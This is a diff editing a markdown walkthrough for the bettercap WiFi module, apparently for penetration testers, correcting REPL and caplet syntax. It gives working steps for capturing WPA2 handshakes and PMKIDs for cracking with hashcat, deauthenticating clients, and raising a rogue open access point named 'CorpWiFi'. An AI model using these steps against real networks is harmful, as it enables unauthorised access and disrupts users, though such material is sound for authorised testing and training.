@@ -1,5 +1,7 @@
 # bettercap — walkthrough
 
+**Verified against:** bettercap 2.32.0
+
 Bettercap's WiFi module is fast for interactive recon and prototype
 attacks. It's not a replacement for hcxtools + hostapd on a real
 engagement, but it's excellent when you want a REPL and a live
@@ -19,19 +21,20 @@ sudo bettercap -iface wlan1
 
 # In the bettercap REPL:
 > set wifi.interface wlan1mon
-> set wifi.recon.channel_hop true
+> set wifi.recon.channels ""              # empty = hop across all
+> set wifi.handshakes.file /tmp/hs.pcap    # collect handshakes here
+> set wifi.handshakes.aggregate true
 > wifi.recon on
-> wifi.show                          # snapshot of APs + STAs seen
-> wifi.recon.channel 6               # lock to channel 6
-> wifi.assoc <BSSID>                 # PMKID capture attempt
-> wifi.handshakes                    # what's been captured so far
+> wifi.show                                # snapshot of APs + STAs
+> set wifi.recon.channels 6                # lock to channel 6
+> wifi.assoc <BSSID>                       # PMKID capture attempt
+> !ls -l /tmp/hs.pcap                      # confirm handshakes land
 ```
 
-Save the session:
-
-```
-> session.save handshakes.session
-```
+Bettercap has no `session.save`/`session.load` verbs. To persist a
+recipe, write the `set` / `on` lines above into a `.cap` file and
+reload them with `load /root/caplets/current-run.cap` (or launch
+bettercap with `-caplet <path>`). See Path B for the caplet form.
 
 ## Path B — PMKID capture in a caplet
 
@@ -41,7 +44,9 @@ repeatedly.
 ```
 # /root/caplets/pmkid-hunt.cap
 set wifi.interface wlan1mon
-set wifi.recon.channel_hop true
+set wifi.recon.channels ""                     # hop everywhere
+set wifi.handshakes.file /root/pmkid.pcap
+set wifi.handshakes.aggregate true
 wifi.recon on
 
 # Auto-associate against every WPA2 AP seen — trigger PMKID emit.
@@ -58,13 +63,21 @@ Run:
 sudo bettercap -iface wlan1 -caplet /root/caplets/pmkid-hunt.cap
 ```
 
-Bettercap dumps captured PMKIDs to `~/.bettercap/*.pcapng` — feed to
-`hcxpcapngtool` and hashcat as usual.
+Bettercap writes captured PMKIDs to the path set by
+`wifi.handshakes.file` (in the caplet above, `/root/pmkid.pcap`) —
+feed to `hcxpcapngtool` and hashcat as usual.
 
 ## Path C — Rogue AP inline
 
+`wifi.ap` takes no positional args; you configure it via `set` and
+then start it bare.
+
 ```
-> wifi.ap "CorpWiFi" ff:ff:ff:ff:ff:ff 6 open
+> set wifi.ap.ssid CorpWiFi
+> set wifi.ap.bssid ff:ff:ff:ff:ff:ff
+> set wifi.ap.channel 6
+> set wifi.ap.encryption false      # open; true = WEP
+> wifi.ap
 ```
 
 Bettercap brings up a hostapd-style AP with the given SSID / BSSID /
@@ -78,24 +91,33 @@ hostapd — bettercap's inline AP is for quick spikes.
 
 ```
 > set wifi.interface wlan1mon
+> set wifi.handshakes.file /tmp/deauth-cap.pcap
+> set wifi.handshakes.aggregate true
 > wifi.recon on
 > sleep 15
 > wifi.deauth <target-BSSID>
 > wifi.recon off
-> wifi.handshakes
+> !ls -l /tmp/deauth-cap.pcap        # inspect the capture
+> wifi.show                          # STAs / handshakes column
 ```
 
 The `wifi.deauth` command sends a burst; bettercap uses its own
 counter, not aireplay's.
 
-## Path E — Client-probe injection
+## Path E — Client-probe observation
+
+Bettercap does not inject probe requests; the WiFi module is a
+listener for them. `wifi.recon on` prints probe requests as clients
+emit them, and each is attached to the STA row in `wifi.show`.
 
 ```
-> wifi.client.probe <STA-MAC> "AttackerSSID"
+> wifi.recon on
+> events.stream on                   # tail every event, incl. probes
 ```
 
-Injects a probe request from a spoofed MAC. Useful for testing
-karma-family behavior on rogue APs.
+For *injected* probes (karma-family testing) reach for `mdk4 p -f
+<ssid-list> <iface>` or `aireplay-ng -9 -e <ssid> <iface>` — not
+bettercap.
 
 ## Path F — REST API for scripted engagements
 
@@ -116,12 +138,13 @@ Endpoints: `/api/session`, `/api/events`, `/api/session/wifi/aps`,
   `sudo airmon-ng start wlan1` first, then `-iface wlan1mon`.
 - **`wifi.assoc all` doesn't yield PMKIDs.** Some APs suppress
   PMKID. Confirm with `wifi.show` that the target reports
-  `WPA2-PSK` and monitor `wifi.handshakes` for the PMKID column.
+  `WPA2-PSK` and inspect the PMKID column in `wifi.show`.
 - **REST API off.** Some Kali builds ship bettercap without the
   API enabled by default; add `-eval "api.rest on; api.rest.
   username user; api.rest.password pass"` to the launch line.
-- **Session state loss on crash.** Save frequently
-  (`session.save`).
+- **State loss on crash.** Bettercap doesn't persist REPL state
+  between runs — encode the recipe in a caplet and reload it on
+  restart.
 
 ## When to reach for bettercap
 
